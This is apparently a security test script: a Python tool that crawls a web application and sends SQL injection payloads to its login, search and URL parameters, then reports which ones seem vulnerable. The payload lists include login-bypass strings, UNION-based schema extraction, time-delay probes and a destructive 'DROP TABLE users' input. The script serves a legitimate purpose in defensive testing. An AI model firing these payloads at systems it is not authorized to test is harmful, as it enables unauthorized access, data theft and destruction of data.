#!/usr/bin/env python
"""
SQL Injection Test Script

This script tests the application's resistance to SQL injection attacks by
attempting various SQL injection payloads in different input fields.

The script checks:
1. Login forms for SQL injection vulnerabilities
2. Search/filter parameters for SQL injection
3. URL parameters for SQL injection
4. Authentication bypass via SQL injection

Usage:
    python sql_injection_test.py [target_url] [username] [password]

Example:
    python sql_injection_test.py https://localhost:8000/ admin password123
"""

import requests
import sys
import time
import re
import os
import json
import urllib.parse
import logging
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from tabulate import tabulate

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('sql_injection_test.log')
    ]
)
logger = logging.getLogger(__name__)

class SQLInjectionTest:
    def __init__(self, target_url, username=None, password=None):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.authenticated = False
        self.timeout = 15  # Request timeout in seconds
        
        # Load SQL injection payloads
        self.payloads = self._load_payloads()
        
        # Initialize results
        self.results = {
            'login': [],
            'search': [],
            'url_params': []
        }
        
        # Error patterns that may indicate SQL injection vulnerability
        self.error_patterns = [
            # MySQL
            r'You have an error in your SQL syntax',
            r'mysql_fetch_array\(\)',
            r'MySQL server version',
            r'Warning.*mysql_.*\(\)',
            r'MySQLSyntaxErrorException',
            
            # PostgreSQL
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_.*\(\)',
            r'valid PostgreSQL result',
            r'PG::SyntaxError:',
            
            # SQLite
            r'SQLite/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'SQLite3::query\(',
            
            # SQL Server
            r'Microsoft SQL Server',
            r'OLE DB.*SQL Server',
            r'Warning.*mssql_.*\(\)',
            r'ODBC SQL Server Driver',
            r'SQLServer JDBC Driver',
            r'SqlException',
            
            # Oracle
            r'ORA-[0-9][0-9][0-9][0-9]',
            r'Oracle error',
            r'Oracle.*Driver',
            r'Warning.*oci_.*\(\)',
            r'Oracle.*ODBCDriver',
            
            # Generic SQL errors
            r'SQL syntax.*',
            r'Error.*SQL',
            r'SQL Error',
            r'SQLSyntaxErrorException',
            r'SQL Exception',
            r'ODBCException',
            r'Driver.*not found',
            r'Access Database Engine',
            r'JET Database Engine',
            r'Unexpected end of command',
            r'SQLSTATE\[\d+\]'
        ]
        
        # Success patterns that may indicate SQL injection worked
        self.success_patterns = [
            r'welcome.*admin',
            r'admin.*panel',
            r'dashboard',
            r'logged in successfully',
            r'authentication successful',
            r'login successful'
        ]

    def _load_payloads(self):
        """Load SQL injection payloads from file or use defaults"""
        # Default payloads if file is not available
        default_payloads = {
            'login': [
                {"username": "admin' OR '1'='1", "password": "anypassword"},
                {"username": "admin'--", "password": "anypassword"},
                {"username": "admin' OR 1=1--", "password": "anypassword"},
                {"username": "admin' OR '1'='1'--", "password": "anypassword"},
                {"username": "admin'; --", "password": "anypassword"},
                {"username": "' OR 1=1 --", "password": "anypassword"},
                {"username": "' OR '1'='1", "password": "anypassword"},
                {"username": "' OR '1'='1' --", "password": "anypassword"},
                {"username": "admin", "password": "' OR '1'='1"},
                {"username": "admin", "password": "' OR '1'='1'--"},
                {"username": "admin", "password": "' OR 1=1--"},
                {"username": "admin", "password": "' OR 1=1 #"},
                {"username": "admin'/*", "password": "*/OR/**/\"1\"=\"1\""},
            ],
            'search': [
                "' OR '1'='1",
                "1' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' ORDER BY 10--",
                "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -",
                "' AND 1=1--",
                "' AND 1=0--",
                "' UNION SELECT @@version--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "1 AND (SELECT 5371 FROM (SELECT(SLEEP(5)))TEST)",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))test)--",
                "' OR EXISTS(SELECT * FROM DUAL WHERE 1=1) AND '1'='1",
                "' OR EXISTS(SELECT * FROM DUAL WHERE 1=1) AND '1'='1' --",
            ],
            'url_params': [
                "'",
                "\"",
                "')",
                "\")",
                "' OR '1'='1",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "\") OR (\"1\"=\"1",
                "') OR ('1'='1'--",
                "1' UNION SELECT 1,2,3,4,5--",
                "' AND 1=0 UNION ALL SELECT 1,2,3,4,5--",
                "1 AND (SELECT 5371 FROM (SELECT(SLEEP(1)))TEST)",
                "1 ORDER BY 10--",
                "1; DROP TABLE users--",
                "1/**/OR/**/1/**/=/**/1"
            ]
        }
        
        # Try to load payloads from file
        try:
            payloads_file = os.path.join(os.path.dirname(__file__), "sql_injection_payloads.json")
            if os.path.exists(payloads_file):
                with open(payloads_file, 'r') as f:
                    return json.load(f)
            else:
                # Create the payloads file for future use
                with open(payloads_file, 'w') as f:
                    json.dump(default_payloads, f, indent=2)
        except Exception as e:
            logger.error(f"Error loading payloads file: {e}")
        
        return default_payloads

    def _get_csrf_token(self, response):
        """Extract CSRF token from the response"""
        try:
            # Try to find the CSRF token in the HTML
            csrf = re.search('name="csrfmiddlewaretoken" value="(.+?)"', response.text)
            if csrf:
                return csrf.group(1)
            
            # Try to find it in the cookies
            if 'csrftoken' in self.session.cookies:
                return self.session.cookies['csrftoken']
                
            return None
        except Exception as e:
            logger.error(f"Error extracting CSRF token: {e}")
            return None

    def login(self):
        """Attempt to log in with the provided credentials"""
        if not self.username or not self.password:
            logger.warning("Username or password not provided. Skipping login.")
            return False
        
        login_url = f"{self.target_url}/login/"
        
        try:
            # Get the login page to extract CSRF token
            response = self.session.get(login_url, verify=False, timeout=self.timeout)
            
            if response.status_code != 200:
                logger.error(f"Error accessing login page. Status code: {response.status_code}")
                return False

            # Extract CSRF token
            csrf_token = self._get_csrf_token(response)
            if not csrf_token:
                logger.warning("Could not extract CSRF token. Proceeding without it.")
            
            # Prepare login data
            login_data = {
                'username': self.username,
                'password': self.password
            }
            
            if csrf_token:
                login_data['csrfmiddlewaretoken'] = csrf_token
            
            # Add captcha if needed (we'll use a dummy value)
            if 'captcha' in response.text.lower():
                logger.warning("CAPTCHA detected. Login may fail.")
                login_data['captcha'] = '12345'  # Dummy value

            # Submit login form
            login_response = self.session.post(
                login_url,
                data=login_data,
                headers={'Referer': login_url},
                verify=False,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check if login was successful
            if "logout" in login_response.text.lower() or "dashboard" in login_response.text.lower():
                logger.info("Logged in successfully.")
                self.authenticated = True
                return True
            else:
                logger.warning("Login failed. Continuing without authentication.")
                return False
            
        except Exception as e:
            logger.error(f"Error during login: {e}")
            return False

    def test_login_form(self):
        """Test login form for SQL injection vulnerabilities"""
        logger.info("\n[*] Testing login form for SQL injection vulnerabilities...")
        
        login_url = f"{self.target_url}/login/"
        
        # First, get the login page to extract CSRF token
        try:
            response = self.session.get(login_url, verify=False, timeout=self.timeout)
            
            if response.status_code != 200:
                logger.error(f"Error accessing login page. Status code: {response.status_code}")
                return
            
            # Extract CSRF token
            csrf_token = self._get_csrf_token(response)
            
            # Test each payload
            for i, payload in enumerate(self.payloads['login']):
                logger.info(f"Testing login payload {i+1}/{len(self.payloads['login'])}: {payload}")
                
                # Prepare a new session for each test
                test_session = requests.Session()
                
                # Get the login page again for a fresh CSRF token
                response = test_session.get(login_url, verify=False, timeout=self.timeout)
                csrf_token = self._get_csrf_token(response)
                
                # Prepare login data
                login_data = {
                    'username': payload['username'],
                    'password': payload['password']
                }
                
                if csrf_token:
                    login_data['csrfmiddlewaretoken'] = csrf_token
                
                # Add captcha if needed (we'll use a dummy value)
                if 'captcha' in response.text.lower():
                    login_data['captcha'] = '12345'  # Dummy value
                
                # Submit login form
                try:
                    login_response = test_session.post(
                        login_url,
                        data=login_data,
                        headers={'Referer': login_url},
                        verify=False,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    
                    # Check for SQL errors
                    has_sql_error = any(re.search(pattern, login_response.text, re.IGNORECASE) 
                                      for pattern in self.error_patterns)
                    
                    # Check for successful bypass
                    has_success = any(re.search(pattern, login_response.text, re.IGNORECASE) 
                                     for pattern in self.success_patterns)
                    
                    # Check if redirected to a different page
                    is_redirected = login_response.url != login_url
                    
                    result = {
                        'payload': payload,
                        'status_code': login_response.status_code,
                        'response_length': len(login_response.text),
                        'has_sql_error': has_sql_error,
                        'has_success': has_success,
                        'is_redirected': is_redirected,
                        'redirected_to': login_response.url if is_redirected else None,
                        'vulnerable': has_sql_error or (has_success and payload['username'] != self.username)
                    }
                    
                    self.results['login'].append(result)
                    
                    if result['vulnerable']:
                        logger.warning(f"VULNERABILITY FOUND: Login form may be vulnerable to SQL injection")
                        logger.warning(f"Payload: {payload}")
                        logger.warning(f"Redirected to: {result['redirected_to']}")
                    
                    # Sleep to avoid overwhelming the server
                    time.sleep(1)
                    
                except Exception as e:
                    logger.error(f"Error testing login payload: {e}")
                    continue
                
        except Exception as e:
            logger.error(f"Error testing login form: {e}")

    def test_search_form(self):
        """Test search/filter functionality for SQL injection vulnerabilities"""
        logger.info("\n[*] Testing search functionality for SQL injection vulnerabilities...")
        
        # First, try to find search forms in the site
        search_urls = self._find_search_forms()
        
        if not search_urls:
            logger.warning("No search forms found on the site. Using default catalog URL.")
            search_urls = [f"{self.target_url}/catalog/"]
        
        # Login if credentials are provided
        if not self.authenticated and self.username and self.password:
            self.login()
        
        # Test each search URL
        for search_url, method, params in search_urls:
            logger.info(f"Testing search form at: {search_url} using {method} method")
            
            # Test each payload
            for i, payload in enumerate(self.payloads['search']):
                logger.info(f"Testing search payload {i+1}/{len(self.payloads['search'])}: {payload}")
                
                for param in params:
                    # Prepare request data
                    data = {p: "" for p in params}  # Initialize all params
                    data[param] = payload  # Set the payload for the current parameter
                    
                    try:
                        # Submit search request
                        if method.upper() == 'GET':
                            search_response = self.session.get(
                                search_url,
                                params=data,
                                verify=False,
                                timeout=self.timeout
                            )
                        else:  # POST
                            # Get CSRF token if needed
                            response = self.session.get(search_url, verify=False, timeout=self.timeout)
                            csrf_token = self._get_csrf_token(response)
                            if csrf_token:
                                data['csrfmiddlewaretoken'] = csrf_token
                            
                            search_response = self.session.post(
                                search_url,
                                data=data,
                                headers={'Referer': search_url},
                                verify=False,
                                timeout=self.timeout
                            )
                        
                        # Check for SQL errors
                        has_sql_error = any(re.search(pattern, search_response.text, re.IGNORECASE) 
                                          for pattern in self.error_patterns)
                        
                        # Check response time for time-based SQLi
                        response_time = search_response.elapsed.total_seconds()
                        
                        result = {
                            'url': search_url,
                            'method': method,
                            'parameter': param,
                            'payload': payload,
                            'status_code': search_response.status_code,
                            'response_length': len(search_response.text),
                            'response_time': response_time,
                            'has_sql_error': has_sql_error,
                            'vulnerable': has_sql_error or response_time > 5  # Time-based SQLi check
                        }
                        
                        self.results['search'].append(result)
                        
                        if result['vulnerable']:
                            logger.warning(f"VULNERABILITY FOUND: Search form may be vulnerable to SQL injection")
                            logger.warning(f"URL: {search_url}, Parameter: {param}, Payload: {payload}")
                        
                        # Sleep to avoid overwhelming the server
                        time.sleep(1)
                        
                    except Exception as e:
                        logger.error(f"Error testing search payload: {e}")
                        continue

    def test_url_parameters(self):
        """Test URL parameters for SQL injection vulnerabilities"""
        logger.info("\n[*] Testing URL parameters for SQL injection vulnerabilities...")
        
        # Find URLs with parameters
        param_urls = self._find_urls_with_parameters()
        
        if not param_urls:
            logger.warning("No URLs with parameters found. Testing default paths.")
            param_urls = [
                f"{self.target_url}/product?id=1",
                f"{self.target_url}/catalog?category=1",
                f"{self.target_url}/search?q=test",
                f"{self.target_url}/user?id=1"
            ]
        
        # Login if credentials are provided
        if not self.authenticated and self.username and self.password:
            self.login()
        
        # Test each URL
        for url in param_urls:
            # Parse URL and parameters
            parsed_url = urllib.parse.urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            logger.info(f"Testing URL parameters at: {url}")
            
            # Test each parameter
            for param, values in query_params.items():
                original_value = values[0]
                
                # Test each payload
                for i, payload in enumerate(self.payloads['url_params']):
                    logger.info(f"Testing URL parameter payload {i+1}/{len(self.payloads['url_params'])}: {payload}")
                    
                    # Create modified query parameters
                    modified_params = query_params.copy()
                    modified_params[param] = [payload]
                    
                    # Build the modified URL
                    modified_query = urllib.parse.urlencode(modified_params, doseq=True)
                    modified_url = f"{base_url}?{modified_query}"
                    
                    try:
                        # Send request
                        response = self.session.get(
                            modified_url,
                            verify=False,
                            timeout=self.timeout
                        )
                        
                        # Check for SQL errors
                        has_sql_error = any(re.search(pattern, response.text, re.IGNORECASE) 
                                          for pattern in self.error_patterns)
                        
                        # Check response time for time-based SQLi
                        response_time = response.elapsed.total_seconds()
                        
                        result = {
                            'url': url,
                            'parameter': param,
                            'original_value': original_value,
                            'payload': payload,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'response_time': response_time,
                            'has_sql_error': has_sql_error,
                            'vulnerable': has_sql_error or response_time > 5  # Time-based SQLi check
                        }
                        
                        self.results['url_params'].append(result)
                        
                        if result['vulnerable']:
                            logger.warning(f"VULNERABILITY FOUND: URL parameter may be vulnerable to SQL injection")
                            logger.warning(f"URL: {url}, Parameter: {param}, Payload: {payload}")
                        
                        # Sleep to avoid overwhelming the server
                        time.sleep(1)
                        
                    except Exception as e:
                        logger.error(f"Error testing URL parameter payload: {e}")
                        continue

    def _find_search_forms(self):
        """Find search forms in the site"""
        search_forms = []
        
        try:
            # Try to visit the home page and catalog page
            for url in [self.target_url, f"{self.target_url}/catalog/", f"{self.target_url}/search/"]:
                response = self.session.get(url, verify=False, timeout=self.timeout)
                
                if response.status_code != 200:
                    continue
                
                # Parse the HTML
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all forms
                forms = soup.find_all('form')
                
                for form in forms:
                    # Check if it's likely a search form
                    inputs = form.find_all('input')
                    is_search = False
                    
                    # Check form attributes
                    if form.get('id') and 'search' in form.get('id').lower():
                        is_search = True
                    elif form.get('class') and any('search' in c.lower() for c in form.get('class')):
                        is_search = True
                    elif form.get('action') and 'search' in form.get('action').lower():
                        is_search = True
                    
                    # Check input attributes
                    for input_tag in inputs:
                        if input_tag.get('name') and input_tag.get('name').lower() in ['q', 'query', 'search', 'keyword', 'keywords', 'term']:
                            is_search = True
                        elif input_tag.get('placeholder') and 'search' in input_tag.get('placeholder').lower():
                            is_search = True
                    
                    if is_search:
                        # Get form action and method
                        action = form.get('action')
                        method = form.get('method', 'GET').upper()
                        
                        # Build the full URL
                        if not action:
                            form_url = url
                        elif action.startswith('/'):
                            form_url = f"{self.target_url}{action}"
                        elif action.startswith('http'):
                            form_url = action
                        else:
                            form_url = f"{url.rstrip('/')}/{action.lstrip('/')}"
                        
                        # Get form parameters
                        params = []
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name and name.lower() not in ['csrfmiddlewaretoken', 'submit']:
                                params.append(name)
                        
                        if params:
                            search_forms.append((form_url, method, params))
        
        except Exception as e:
            logger.error(f"Error finding search forms: {e}")
        
        return search_forms

    def _find_urls_with_parameters(self):
        """Find URLs with parameters in the site"""
        param_urls = []
        visited = set()
        
        try:
            # Start with home page
            urls_to_visit = [self.target_url]
            
            while urls_to_visit and len(visited) < 10:  # Limit to 10 pages
                url = urls_to_visit.pop(0)
                
                if url in visited or not url.startswith(self.target_url):
                    continue
                
                visited.add(url)
                
                # Check if URL has parameters
                if '?' in url:
                    param_urls.append(url)
                
                # Visit the page and look for more links
                try:
                    response = self.session.get(url, verify=False, timeout=self.timeout)
                    
                    if response.status_code != 200:
                        continue
                    
                    # Parse the HTML
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        
                        # Build the full URL
                        if href.startswith('/'):
                            full_url = f"{self.target_url}{href}"
                        elif href.startswith('http'):
                            full_url = href
                        else:
                            full_url = f"{url.rstrip('/')}/{href.lstrip('/')}"
                        
                        # Check if URL has parameters
                        if '?' in full_url and full_url not in visited and full_url.startswith(self.target_url):
                            param_urls.append(full_url)
                            urls_to_visit.append(full_url)
                    
                except Exception as e:
                    logger.error(f"Error visiting URL {url}: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"Error finding URLs with parameters: {e}")
        
        return param_urls

    def analyze_results(self):
        """Analyze the test results and generate report"""
        logger.info("\n[ANALYSIS]")
        
        vulnerable_count = 0
        
        # Check login form results
        if self.results['login']:
            login_vulnerable = any(r['vulnerable'] for r in self.results['login'])
            
            logger.info("\n[LOGIN FORM]")
            if login_vulnerable:
                vulnerable_count += 1
                logger.warning("VULNERABLE: The login form appears to be vulnerable to SQL injection")
                
                # Show vulnerable payloads
                vulnerable_payloads = [r['payload'] for r in self.results['login'] if r['vulnerable']]
                logger.warning(f"Successful payloads:")
                for payload in vulnerable_payloads:
                    logger.warning(f"  Username: {payload['username']}")
                    logger.warning(f"  Password: {payload['password']}")
            else:
                logger.info("SECURE: The login form appears to be resistant to SQL injection")
        
        # Check search form results
        if self.results['search']:
            search_vulnerable = any(r['vulnerable'] for r in self.results['search'])
            
            logger.info("\n[SEARCH FUNCTIONALITY]")
            if search_vulnerable:
                vulnerable_count += 1
                logger.warning("VULNERABLE: The search functionality appears to be vulnerable to SQL injection")
                
                # Show vulnerable payloads
                table_data = []
                for result in self.results['search']:
                    if result['vulnerable']:
                        table_data.append([
                            result['url'],
                            result['method'],
                            result['parameter'],
                            result['payload'],
                            "Yes" if result['has_sql_error'] else "No",
                            f"{result['response_time']:.2f}s"
                        ])
                
                if table_data:
                    headers = ["URL", "Method", "Parameter", "Payload", "SQL Error", "Response Time"]
                    logger.warning(tabulate(table_data, headers=headers, tablefmt="grid"))
            else:
                logger.info("SECURE: The search functionality appears to be resistant to SQL injection")
        
        # Check URL parameter results
        if self.results['url_params']:
            url_vulnerable = any(r['vulnerable'] for r in self.results['url_params'])
            
            logger.info("\n[URL PARAMETERS]")
            if url_vulnerable:
                vulnerable_count += 1
                logger.warning("VULNERABLE: URL parameters appear to be vulnerable to SQL injection")
                
                # Show vulnerable payloads
                table_data = []
                for result in self.results['url_params']:
                    if result['vulnerable']:
                        table_data.append([
                            result['url'],
                            result['parameter'],
                            result['payload'],
                            "Yes" if result['has_sql_error'] else "No",
                            f"{result['response_time']:.2f}s"
                        ])
                
                if table_data:
                    headers = ["URL", "Parameter", "Payload", "SQL Error", "Response Time"]
                    logger.warning(tabulate(table_data, headers=headers, tablefmt="grid"))
            else:
                logger.info("SECURE: URL parameters appear to be resistant to SQL injection")
        
        # Overall summary
        logger.info("\n[SUMMARY]")
        if vulnerable_count > 0:
            logger.warning(f"The application appears to be vulnerable to SQL injection in {vulnerable_count} area(s)")
            logger.warning("Recommendations:")
            logger.warning("1. Use parameterized queries or prepared statements")
            logger.warning("2. Implement proper input validation and sanitization")
            logger.warning("3. Use Django ORM instead of raw SQL queries")
            logger.warning("4. Implement proper error handling to avoid exposing SQL errors")
            logger.warning("5. Use a Web Application Firewall (WAF) for additional protection")
        else:
            logger.info("The application appears to be resistant to SQL injection attacks")
            logger.info("Good security practices to maintain:")
            logger.info("1. Continue using Django ORM for database operations")
            logger.info("2. Regularly update all dependencies to patch security vulnerabilities")
            logger.info("3. Perform regular security audits and penetration testing")

    def run_test(self):
        """Run the full SQL injection test suite"""
        logger.info(f"[*] Starting SQL injection test on {self.target_url}")
        logger.info(f"[*] Loaded {len(self.payloads['login'])} login payloads")
        logger.info(f"[*] Loaded {len(self.payloads['search'])} search payloads")
        logger.info(f"[*] Loaded {len(self.payloads['url_params'])} URL parameter payloads")
        
        # Test login form
        self.test_login_form()
        
        # Test search functionality
        self.test_search_form()
        
        # Test URL parameters
        self.test_url_parameters()
        
        # Analyze results
        self.analyze_results()

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} [target_url] [username] [password]")
        print(f"Example: {sys.argv[0]} https://localhost:8000/ admin password123")
        sys.exit(1)
    
    target_url = sys.argv[1]
    username = sys.argv[2] if len(sys.argv) > 2 else None
    password = sys.argv[3] if len(sys.argv) > 3 else None
    
    try:
        # Verify that required packages are installed
        import bs4
        import tabulate
    except ImportError as e:
        missing_package = str(e).split("'")[1]
        print(f"[!] Required package '{missing_package}' is missing. Please install it with:")
        print(f"    pip install {missing_package}")
        print("[!] You may also need to install: beautifulsoup4, tabulate")
        sys.exit(1)
    
    tester = SQLInjectionTest(target_url, username, password)
    tester.run_test()

if __name__ == "__main__":
    main()